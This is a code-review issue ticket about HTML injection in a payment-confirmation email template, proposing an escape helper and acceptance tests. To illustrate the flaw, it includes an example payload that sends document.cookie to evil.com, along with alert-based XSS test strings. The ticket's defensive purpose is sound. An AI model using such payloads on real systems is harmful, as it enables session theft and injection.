---
status: pending
priority: p2
issue_id: "006"
tags: [code-review, security, xss, email]
dependencies: []
---

# HTML Injection in Confirmation Email Template

## Problem Statement

User-controlled fields are interpolated directly into the HTML email template using template literals, with no HTML encoding. The `s()` sanitizer only trims and truncates — it does not escape HTML entities.

Fields injected raw into HTML:
- `firstName` — line 254: `We've got you, ${firstName}!`
- `domain` — table cell
- `modeDisplay` — table cell
- `duration` — table cell
- `stipend` — table cell

A user submitting `firstName = '<img src=x onerror=fetch("https://evil.com/"+document.cookie)>'` would have that string placed verbatim in the email HTML. Most modern email clients strip JS handlers, but `<img>` tags with tracking pixels render in many clients, and `<a href="javascript:...">` executes in some legacy clients. The MongoDB document also stores the raw injectable string, creating risk if an admin UI ever renders it.

## Findings

- `api/verify-payment.js:sendConfirmationEmail()` — HTML template uses `${firstName}`, `${domain}`, `${modeDisplay}`, `${duration}`, `${stipend}` without escaping
- `s()` helper (line 90) — `String(v || '').trim().slice(0, max)` — no HTML encoding
- The `text:` body (plain-text email) does NOT need escaping and is fine as-is

## Proposed Solutions

### Option A: Add inline `he()` HTML-escape utility
```js
const he = (s) => String(s)
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
  .replace(/'/g, '&#x27;');
```
Apply as `he(firstName)`, `he(domain)`, `he(modeDisplay)`, `he(duration)`, `he(stipend)` in the HTML template only.
- **Pros:** Self-contained, no dependencies, minimal change
- **Effort:** Small
- **Risk:** None — HTML-escaped values render correctly in all email clients

### Option B: Use an HTML escaping library (`he` npm package)
- **Pros:** Battle-tested, handles edge cases
- **Cons:** Adds a dependency for a trivial task; Option A is sufficient
- **Effort:** Small

## Recommended Action

Option A — 5-line utility function, zero dependencies.

## Technical Details

- **Affected file:** `api/verify-payment.js` — `sendConfirmationEmail()` function, HTML template section
- **OWASP:** A03 Injection

## Acceptance Criteria

- [ ] `firstName = '<script>alert(1)</script>'` renders as escaped text in email, not as a script tag
- [ ] `domain = '<img src=x onerror=alert(1)>'` renders as escaped text
- [ ] Normal values (`John`, `Web Development`) still render correctly in email
- [ ] Plain-text `text:` body is unchanged (no escaping needed there)

## Work Log

- 2026-03-15: Identified by security-sentinel agent during code review
